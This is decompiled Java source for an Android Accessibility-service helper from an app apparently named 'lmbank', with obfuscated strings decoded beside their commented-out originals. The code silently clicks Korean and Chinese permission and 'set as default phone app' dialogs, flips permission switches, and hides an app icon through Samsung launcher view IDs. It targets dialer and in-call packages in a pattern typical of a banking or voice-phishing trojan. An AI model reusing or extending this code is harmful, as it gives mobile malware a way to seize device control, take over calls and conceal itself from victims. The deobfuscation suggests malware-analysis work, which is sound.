package com.wish.lmbank.helper;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.wish.lmbank.service.AutoServiceV;

import java.util.Iterator;
import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/helper/AccessibilityHelper.class */
public class AccessibilityHelper {
    public static final String PACKAGE_ANDROID_PERMISSION_CONTROLLER = "com.google.android.permissioncontroller";
    public static final String PACKAGE_ANDROID_SERVER_TELECOM = "com.android.server.telecom";
    public static final String PACKAGE_GOOGLE_PACKAGE_INSTALLER = "com.google.android.packageinstaller";
    public static final String[] PACKAGE_NAME_DIALER = null;
    public static final String PACKAGE_NAME_INSTALLER = "com.google.android.packageinstaller";
    public static final String PACKAGE_NAME_MESSAGE = "com.samsung.android.messaging";
    public static final String PACKAGE_NAME_RADIO_BUTTON = "android.widget.RadioButton";
    public static final String PACKAGE_NAME_SAMSUNG_IN_CALL_UI = "com.samsung.android.incallui";
    public static final String PACKAGE_NAME_SETTINGS = "com.android.settings";
    public static final String PACKAGE_NAME_SWITCH = "android.widget.Switch";
    public static final String PACKAGE_SAMSUNG_PERMISSION_CONTROLLER = "com.samsung.android.permissioncontroller";
    public static final String TCALL_APP_NAME = "T전화";
    public static final String TCALL_PACKAGE = "com.skt.prod.dialer";
    public static final String[] TEXT_ALERT_WINDOW = null;
    public static final String TEXT_CN_CANCEL = "取消";
    public static final String TEXT_CN_CONFIRM = "确定";
    public static final String TEXT_CN_NO_ASK = "不再询问";
    public static final String TEXT_CN_SET_DEFAULT_APPLICATION = "设为默认应用";
    public static final String TEXT_CN_SET_DEFAULT_APPLICATION_2 = "设为默认电话应用";
    public static final String TEXT_KR_CANCEL = "취소";
    public static final String TEXT_KR_CONFIRM = "확인";
    public static final String TEXT_KR_NO_ASK = null;
    public static final String TEXT_KR_SET_DEFAULT = "기본으로 설정";
    public static final String TEXT_KR_SET_DEFAULT_APPLICATION = null;
    public static final String TEXT_LANGUAGE_CN = "CN";
    public static final String TEXT_LANGUAGE_KR = "KR";
    public static final String[] UNINSTALL_APK = null;
    private static boolean isClickApp;


    public static boolean checkRadioButton(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        CharSequence className;
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
        if (findAccessibilityNodeInfosByText == null || findAccessibilityNodeInfosByText.isEmpty()) {
            return false;
        }
        for (AccessibilityNodeInfo accessibilityNodeInfo2 : findAccessibilityNodeInfosByText) {
            if (accessibilityNodeInfo2 != null) {
                AccessibilityNodeInfo accessibilityNodeInfo3 = accessibilityNodeInfo2;
                if (!accessibilityNodeInfo2.isClickable()) {
                    accessibilityNodeInfo3 = accessibilityNodeInfo2.getParent();
                }
                if (accessibilityNodeInfo3 != null && accessibilityNodeInfo3.getChildCount() > 0) {
                    for (int i = 0; i < accessibilityNodeInfo3.getChildCount(); i++) {
                        AccessibilityNodeInfo child = accessibilityNodeInfo3.getChild(i);
//                         if (child != null && (className = child.getClassName()) != null && (bb7d7pu7.m5998("CAcNGwYADUceAA0ODB1HOwgNAAYrHB0dBgc").contentEquals(className) || bb7d7pu7.m5998("CAcNGwYADUceAA0ODB1HOh4AHQoB").contentEquals(className))) {
                        if (child != null && (className = child.getClassName()) != null && ("android.widget.RadioButton".contentEquals(className) || "android.widget.Switch".contentEquals(className))) {
                            if (child.isChecked()) {
                                return true;
                            }
                            accessibilityNodeInfo3.performAction(16);
                            return true;
                        }
                    }
                    continue;
                }
            }
        }
        return false;
    }

    public static boolean findViewByIdAndClick(AccessibilityService accessibilityService, String str) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
        AccessibilityNodeInfo rootInActiveWindow = accessibilityService.getRootInActiveWindow();
        if (rootInActiveWindow == null || (findAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str)) == null || findAccessibilityNodeInfosByViewId.isEmpty()) {
            return false;
        }
        for (AccessibilityNodeInfo accessibilityNodeInfo : findAccessibilityNodeInfosByViewId) {
            if (accessibilityNodeInfo != null) {
                return performClick(accessibilityNodeInfo);
            }
        }
        return false;
    }

    private static boolean performClick(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        if (accessibilityNodeInfo.isClickable()) {
            return accessibilityNodeInfo.performAction(16);
        }
        return performClick(accessibilityNodeInfo.getParent());
    }

    public static boolean uncheckButton(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        AccessibilityNodeInfo next;
        CharSequence className;
        Iterator<AccessibilityNodeInfo> it = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str).iterator();
        if (!it.hasNext() || (next = it.next()) == null) {
            return false;
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = next;
        if (!next.isClickable()) {
            accessibilityNodeInfo2 = next.getParent();
        }
        if (accessibilityNodeInfo2 == null || accessibilityNodeInfo2.getChildCount() <= 0) {
            return false;
        }
        for (int i = 0; i < accessibilityNodeInfo2.getChildCount(); i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i);
//             if (child != null && (className = child.getClassName()) != null && bb7d7pu7.m5998("CAcNGwYADUceAA0ODB1HOh4AHQoB").contentEquals(className)) {
            if (child != null && (className = child.getClassName()) != null && "android.widget.Switch".contentEquals(className)) {
                if (child.isChecked()) {
                    accessibilityNodeInfo2.performAction(16);
                    return true;
                }
                return true;
            }
        }
        return false;
    }

    public static boolean executeClick(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByText(str)) {
            if (accessibilityNodeInfo2 != null) {
                AccessibilityNodeInfo accessibilityNodeInfo3 = accessibilityNodeInfo2;
                if (!accessibilityNodeInfo2.isClickable()) {
                    accessibilityNodeInfo3 = accessibilityNodeInfo2.getParent();
                }
                if (accessibilityNodeInfo3 != null && accessibilityNodeInfo3.isClickable()) {
                    return accessibilityNodeInfo3.performAction(16);
                }
            }
        }
        return false;
    }

    public static boolean isExist(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
        return findAccessibilityNodeInfosByText != null && findAccessibilityNodeInfosByText.size() > 0;
    }

    public static boolean isExist(AccessibilityNodeInfo accessibilityNodeInfo, String[] strArr) {
        for (String str : strArr) {
            if (isExist(accessibilityNodeInfo, str)) {
                return true;
            }
        }
        return false;
    }

    public static boolean executeHideApplication(AutoServiceV autoServiceV, AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        AccessibilityNodeInfo parent;
        int childCount;
        Iterator<AccessibilityNodeInfo> it;
        int childCount2;
        int childCount3;
        int i = Build.VERSION.SDK_INT;
//         String m5998 = bb7d7pu7.m5998("CgYERxoMCkcIBw0bBgANRwgZGUcFCBwHCgEMG1MADUYIGRkaNhkACgIMGzYIBQU2BQAaHTYfAAwe");
        String m5998 = "com.sec.android.app.launcher:id/apps_picker_all_list_view";
        if (i >= 28) {
            boolean z = false;
//             for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(bb7d7pu7.m5998("CgYERxoMCkcIBw0bBgANRwgZGUcFCBwHCgEMG1MADUYIGRkaNhkACgIMGzYBAA0NDAc2CBkZNhsMChAKBQwbNh8ADB4"))) {
            for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("com.sec.android.app.launcher:id/apps_picker_hidden_app_recycler_view")) {
                if (accessibilityNodeInfo2 != null && (childCount3 = accessibilityNodeInfo2.getChildCount()) > 0) {
                    int i2 = 0;
                    while (true) {
                        if (i2 >= childCount3) {
                            break;
                        }
                        AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i2);
                        if (child != null && str.equals(child.getText())) {
                            z = true;
                            break;
                        }
                        i2++;
                    }
                }
            }
            if (z) {
                isClickApp = false;
                return true;
            }
            if (Build.VERSION.SDK_INT == 28) {
                it = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(m5998).iterator();
            } else {
//                 it = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(bb7d7pu7.m5998("CgYERxoMCkcIBw0bBgANRwgZGUcFCBwHCgEMG1MADUYIGRkaNhkACgIMGzYFABodNh8ADB4")).iterator();
                it = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("com.sec.android.app.launcher:id/apps_picker_list_view").iterator();
            }
            while (it.hasNext()) {
                AccessibilityNodeInfo next = it.next();
                if (next != null && (childCount2 = next.getChildCount()) > 0) {
                    if (Build.VERSION.SDK_INT == 28) {
                        Iterator<AccessibilityNodeInfo> it2 = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str).iterator();
                        while (it2.hasNext()) {
                            AccessibilityNodeInfo next2 = it2.next();
                            StringBuilder sb = new StringBuilder();
//                             sb.append(bb7d7pu7.m5998("HQwRHVNJ"));
                            sb.append("text: ");
//                             sb.append((Object) (next2 != null ? next2.getText() : bb7d7pu7.m5998("BwYHDA")));
                            sb.append((Object) (next2 != null ? next2.getText() : "none"));
//                             Log.e(bb7d7pu7.m5998("JBAoCgoMGho6DBsfAAoM"), sb.toString());
                            Log.e("MyAccessService", sb.toString());
                            if (next2 != null) {
                                return next2.performAction(16);
                            }
                        }
                        continue;
                    } else {
                        int i3 = 0;
                        while (true) {
                            if (i3 >= childCount2) {
                                break;
                            }
                            AccessibilityNodeInfo child2 = next.getChild(i3);
                            if (child2 == null || !str.equals(child2.getText()) || !child2.isClickable()) {
                                i3++;
                            } else if (!isClickApp) {
                                isClickApp = true;
                                child2.performAction(16);
                            }
                        }
                    }
                }
            }
            return false;
        } else if (Build.VERSION.SDK_INT >= 26) {
            Iterator<AccessibilityNodeInfo> it3 = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(m5998).iterator();
            while (it3.hasNext()) {
                for (AccessibilityNodeInfo accessibilityNodeInfo3 : accessibilityNodeInfo.findAccessibilityNodeInfosByText(str)) {
                    if (accessibilityNodeInfo3 != null && (parent = accessibilityNodeInfo3.getParent()) != null && (childCount = parent.getChildCount()) > 0) {
                        for (int i4 = 0; i4 < childCount; i4++) {
                            AccessibilityNodeInfo child3 = parent.getChild(i4);
                            if (child3 != null) {
//                                 if (bb7d7pu7.m5998("CAcNGwYADUceAA0ODB1HKgEMCgIrBhE").equals(child3.getClassName())) {
                                if ("android.widget.CheckBox".equals(child3.getClassName())) {
                                    if (child3.isChecked()) {
                                        return true;
                                    }
                                    return child3.performAction(16);
                                }
                            }
                        }
                        continue;
                    }
                }
            }
            return false;
        } else {
            return false;
        }
    }
}
